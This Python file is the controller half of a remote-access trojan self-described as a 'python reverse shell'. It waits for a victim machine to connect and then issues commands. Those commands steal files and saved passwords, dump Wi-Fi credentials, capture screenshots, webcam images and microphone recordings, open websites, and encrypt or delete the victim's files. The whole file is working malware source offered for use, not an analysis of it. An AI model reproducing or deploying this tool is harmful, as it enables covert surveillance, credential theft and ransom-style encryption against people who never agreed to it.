#!/usr/bin/python
# -*- coding: utf-8 -*-

##############################
#   **python reverse shell**
# coded by: oseid Aldary
# updated by: Annor-Gyimah
##############################
#Server_File

import socket,struct,sys,os;from datetime import datetime
#from my_logger import logging
from base64 import b64decode
from random import randrange
import pyaudio
import wave
import cv2
import tqdm
try: input = raw_input
except NameError: input = input

class senrev:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)
    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:return None
            packet += frame
        return packet

def help():
   print("""
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:help         Show this help message
:download     Download file from client machine
:upload       Upload file to client machine
:kill         Kill the connection with client machine
:exec         Run external command
:screenshot   Take a screenshot of the client machine
:recording    Take a voice recording of the client
:check        Check if client machine is connected to internet
:wifi         Show Client machine wifi info [names,passwod,etc]
:browse       Open an website on client machine browser
:encrypt      Encrypt a file on a client machine
:decrypt      Decrypt a file on a client machine
pwd           Print working directory in client machine
cd -          Switch back to previous directory in client machine
cd --         Switch back to first directory when connection was established with client machine
""")
def delete(filee):
  cmd = filee
  filee = "".join(filee.split(":delete")).strip()
  if filee.strip():
   filetodel = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   print("[!] Deleting [ {} ].....".format(filetodel))
   #deletedpath = controler.recv().decode("UTF-8")
   #print("[*] Deletion Completed :)\n[*] file Deleted from : ()\n"+str(deletedpath).strip()+" in client machine\n")
   #sound = controler.recv()
   delete = controler.recv()



def encrypt_file(filee):
  cmd = filee
  filee = "".join(filee.split(":encrypt")).strip()
  if filee.strip():
   filetoenc = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   print("[!] Encrypting [ {} ].....".format(filetoenc))
   #deletedpath = controler.recv().decode("UTF-8")
   #print("[*] Deletion Completed :)\n[*] file Deleted from : ()\n"+str(deletedpath).strip()+" in client machine\n")
   #sound = controler.recv()
   encrypt = controler.recv()
   



def decrypt_file(filee):
  cmd = filee
  filee = "".join(filee.split(":decrypt")).strip()
  if filee.strip():
   filetodec = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   print("[!] Decrypting [ {} ].....".format(filetodec))
   decrypt = controler.recv()

def download(filee):
  cmd = filee
  filee = "".join(filee.split(":download")).strip()
  if filee.strip():
   filetodown = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   #filesize = controler.recv()
   down = controler.recv().decode("UTF-8",'ignore')
   if down == "true":
     print("[~] Downloading [ {} ]...".format(filetodown))

     wf = open(filetodown, "wb")
     filesize = os.path.getsize(filetodown)
     progress = tqdm.tqdm(range(filesize), f"Receiving {filetodown}", unit="B", unit_scale=True, unit_divisor=1024)
     while True:
     
      data = controler.recv()
      if data == b":DONE:": break
      elif data == b":Aborted:":
        wf.close()
        os.remove(filetodown)
        print("[!] Downloading Has Aborted By Client!")
        return
      wf.write(data)
      progress.update(len(data))
     wf.close()
     print("[*] Download Complete :)\n[*] file Saved In : {}\n".format(os.getcwd()+os.sep+filetodown))
   else: 
    print(down)
  else: print("Usage: :download <file_to_download_from_client_machine>\n")




def upload(cmd):
    filetoup = "".join(cmd.split(":upload")).strip()
    filesize = os.path.getsize(filetoup)
    if not filetoup.strip(): print("usage: :upload <file_to_upload>\n")
    else:
       if not os.path.isfile(filetoup): print("error: open: no such file: "+filetoup+"\n")
       else:
          progress = tqdm.tqdm(range(filesize), f"Sending {filetoup}",unit="B", unit_scale=True, unit_divisor=1024)
          controler.send(cmd.encode("UTF-8"))
          print("[~] Uploading [ {} ]...".format(filetoup))
          with open(filetoup,"rb") as wf:
            for data in iter(lambda: wf.read(4100), b""):
              try:
                  controler.send(data)
                  progress.update(len(data))
              except(KeyboardInterrupt,EOFError):
                wf.close()
                controler.send(b":Aborted:")
                print("[!] Uploading Has Been Aborted By User!\n")
                return
          controler.send(b":DONE:")
          savedpath = controler.recv().decode("UTF-8")
          print("[*] Upload Complete :)\n[*] File uploaded in : "+str(savedpath).strip()+" in client machine\n")
def check_con():
     print("[~] Checking....")
     controler.send(b":check_internet_connection")
     status = controler.recv().decode("UTF-8").strip()
     if status == "UP": print("[*] client: Connected to internet !\n")
     else: print("[!] client: Not Connected to internet !\n")


def screenshot():
    
    file_name = str(datetime.now().time())

    file_name = file_name.split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    with open(file_name, "wb") as f:
        image = controler.recv()
        f.write(image)
        while not ("completeServing" in str(image)):
            image = controler.recv()
            f.write(image)


def webcam():
    
    file_name = str(datetime.now().time())

    file_name = file_name.split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    with open(file_name, "wb") as f:
        webimage = controler.recv()
        f.write(webimage)
        while not ("completeServing" in str(webimage)):
            webimage = controler.recv()
            f.write(webimage)




def recording():
    
    filename = str(datetime.now().time())

    filename = filename.split(".")[0].replace(":", "-")
    filename = filename + '.wav'
    
    #filename = 'path_of_file.wav'
    with open(filename, "wb") as f:
        sound = controler.recv()
        f.write(sound)
        while not ("completeServing" in str(sound)):
            sound = controler.recv()
            f.write(sound)





          
      
   
def browse(cmd):
  url = "".join(cmd.split(":browse")).strip()
  if not url.strip(): print("Usage: :browse <Websute_URL>\n")
  else:
    if not url.startswith(("http://","https://")): url = "http://"+url
    print("[~] Opening [ {} ]...".format(url))
    controler.send(":browse {}".format(url).encode("UTF-8"))
    print("[*] Done \n")

def control():
    try:
      cmd = str(input("[{}]:~# ".format(a[0])))
      while not cmd.strip(): cmd = str(input("[{}]:~# ".format(a[0])))
      if cmd == ":help":
            help()
            control()
      elif ":download" in cmd:
            download(cmd)
            control()
      elif ":upload" in cmd:
           upload(cmd)
           control()
      #elif ":delete" in cmd:
           #delete(cmd)
           #control()
      elif cmd ==":kill":
         print("[!] Connection has been killed!")
         controler.send(b":kill")
         c.shutdown(2)
         c.close()
         s.close()
         exit(1)
      elif ":exec" in cmd:
           cmd = "".join(cmd.split(":exec")).strip()
           if not cmd.strip(): print("Usage: :exec <command>\n")
           else:
               print("[*] exec:")
               os.system(cmd)
               print(" ")
           control()
      elif cmd == ":check":
        check_con()
        control()
      elif cmd == ":wifi":
        print("[*] Geting Wifi profiles info...")
        controler.send(b":wifi")
        info = controler.recv()
        try:
          info = info.decode("UTF-8","ignore")
        except  UnicodeEncodeError: info = info
        finally:
           if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine!\n")
           else:
             print("[*] INFO:\n")
             print(info + "\n")
             control()
      elif cmd == ":passwords":
        print("[*] Geting Saved passwords...")
        controler.send(b":passwords")
        
        try:
          #file_data = file_data.decode("UTF-8","ignore")
          with open(f'savedpass.txt','wb') as f:
            file_data = controler.recv()
            f.write(file_data)
        except:
          pass
        control()
      elif ":browse" in cmd:
        browse(cmd)
        control()
      elif cmd.lower() == "cls" or cmd == "clear":
             os.system("cls||clear")
             control()
      controler.send(cmd.encode("UTF-8"))
      DATA = controler.recv()
     
      if "image" in DATA.decode("utf-8", "ignore"):
          screenshot()
          print("done")
          control()
      elif "sound" in DATA.decode("utf-8", "ignore"):
          recording()
          print("done")
          control()
      elif "webimage" in DATA.decode("utf-8", "ignore"):
          webcam()
          print("done")
          control()
      elif "delete" in DATA.decode("utf-8", "ignore"):
          delete(cmd)
          print('done')
          control()
      elif "encrypt" in DATA.decode("utf-8", "ignore"):
          encrypt_file(cmd)
          print('done')
          control()
      elif "decrypt" in DATA.decode("utf-8", "ignore"):
          decrypt_file(cmd)
          print('done')
          control()
     
          
      if DATA.strip(): print(DATA.decode("UTF-8",'ignore'))
      control()
    except (KeyboardInterrupt, EOFError):
           print(" ")
           control()
    except socket.error:
       print("[!] Connection Lost to: "+a[0]+" !")
       c.close()
       s.close()
       exit(1)
    except UnicodeEncodeError:
        print(DATA)
        print(" ")
        control()
    except Exception as e:
       print("[!] An error occurred: "+str(e)+"\n")
       control()

def server(IP,PORT,senrev=senrev):
  global s
  global c
  global a
  global controler
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((IP,PORT))
  s.listen(1)
  print("[*] Server started on > {}:{} < | at [{}]".format(IP,PORT,datetime.now().strftime("%H:%M:%S")))
  try:
    c,a = s.accept()
    controler = senrev(c)
    print("\n[*] Connection From {}:{}".format(a[0],a[1]))
    print("[*] type ':help' to show help message\n")
    control()
  except (KeyboardInterrupt,EOFError):
         print(" ")
         exit(1)
if len(sys.argv) !=3:
        print("Usage: python server.py <IP> <PORT>")
        exit(1)
server(sys.argv[1],int(sys.argv[2]))
